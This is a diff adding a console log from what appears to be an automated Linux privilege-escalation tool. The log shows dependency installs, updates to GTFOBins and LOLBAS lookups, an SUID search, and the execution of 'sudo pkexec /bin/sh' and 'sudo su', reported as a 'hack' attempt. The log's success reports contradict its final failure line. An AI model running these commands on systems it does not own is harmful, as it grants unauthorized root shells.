@@ -1,0 +1,74 @@
+Defaulting to user installation because normal site-packages is not writeable
+Requirement already satisfied: python-git in /home/dicey17/.local/lib/python3.11/site-packages (2018.2.1)
+Requirement already satisfied: send2trash in /home/dicey17/.local/lib/python3.11/site-packages (from python-git) (1.8.2)
+Defaulting to user installation because normal site-packages is not writeable
+Requirement already satisfied: pyautogui in /home/dicey17/.local/lib/python3.11/site-packages (0.9.53)
+Requirement already satisfied: PyTweening>=1.0.1 in /home/dicey17/.local/lib/python3.11/site-packages (from pyautogui) (1.0.4)
+Requirement already satisfied: mouseinfo in /home/dicey17/.local/lib/python3.11/site-packages (from pyautogui) (0.1.3)
+Requirement already satisfied: pygetwindow>=0.0.5 in /home/dicey17/.local/lib/python3.11/site-packages (from pyautogui) (0.0.9)
+Requirement already satisfied: pymsgbox in /home/dicey17/.local/lib/python3.11/site-packages (from pyautogui) (1.0.9)
+Requirement already satisfied: pyscreeze>=0.1.21 in /home/dicey17/.local/lib/python3.11/site-packages (from pyautogui) (0.1.28)
+Requirement already satisfied: python3-Xlib in /home/dicey17/.local/lib/python3.11/site-packages (from pyautogui) (0.15)
+Requirement already satisfied: pyrect in /home/dicey17/.local/lib/python3.11/site-packages (from pygetwindow>=0.0.5->pyautogui) (0.2.0)
+Requirement already satisfied: pyperclip in /usr/lib/python3/dist-packages (from mouseinfo->pyautogui) (1.8.2)
+Defaulting to user installation because normal site-packages is not writeable
+Requirement already satisfied: appdirs in /usr/lib/python3/dist-packages (from -r GTFOBLookup/requirements.txt (line 1)) (1.4.4)
+Requirement already satisfied: colorama in /usr/lib/python3/dist-packages (from -r GTFOBLookup/requirements.txt (line 2)) (0.4.6)
+Requirement already satisfied: gitpython in /usr/lib/python3/dist-packages (from -r GTFOBLookup/requirements.txt (line 3)) (3.1.30)
+Requirement already satisfied: pyyaml in /usr/lib/python3/dist-packages (from -r GTFOBLookup/requirements.txt (line 4)) (6.0)
+Requirement already satisfied: gitdb<5,>=4.0.1 in /usr/lib/python3/dist-packages (from gitpython->-r GTFOBLookup/requirements.txt (line 3)) (4.0.9)
+Checking GTFOBins for updates...
+Local copy of GTFOBins is up to date
+Checking LOLBAS for updates...
+Local copy of LOLBAS is up to date
+Checking WADComs for updates...
+Local copy of WADComs is up to date
+Checking HijackLibs for updates...
+Local copy of HijackLibs is up to date
+root
+------------------------------------------------------------------------------------------
+Installing Libraries...
+Installing python-git...
+Installing pyautogui...
+All the required libraries have been successfully installed!!
+------------------------------------------------------------------------------------------
+Cloning GTFOBins...
+Cloning from - https://github.com/nccgroup/GTFOBLookup.git in process...
+Installing requirements...
+Installing new updates...
+Cloning successful !!!
+------------------------------------------------------------------------------------------
+Finding SUIDs...
+SUIDs found !!!
+------------------------------------------------------------------------------------------
+Filterning SUIDs (Phase 1)...
+SUIDs filtered. Phase 1 completed !!! 
+------------------------------------------------------------------------------------------
+Filterning SUIDs (Phase 2)...
+SUIDs filtered. Phase 2 completed !!! 
+------------------------------------------------------------------------------------------
+Extracting commands from GTFOBins...
+sudo pkexec /bin/sh
+
+sudo su
+
+Commands extraction successful.
+Total commands found:  2
+------------------------------------------------------------------------------------------
+Executing whoami...
+Command: whoami, executed in new thread...
+------------------------------------------------------------------------------------------
+Executing commands...
+Trying to hack using command:  sudo pkexec /bin/sh
+
+Privlege escallation throgh the command successful! Command:  sudo pkexec /bin/sh
+
+------------------------------------------------------------------------------------------
+Cleaning junks...
+Cleaning completed !!!
+
+------------------------------------------------------------------------------------------
+Privlege escallation succesful!
+Typing command: whoami
+Testing if we got the root or not...
+Privlege escallation failed for:  sudo 
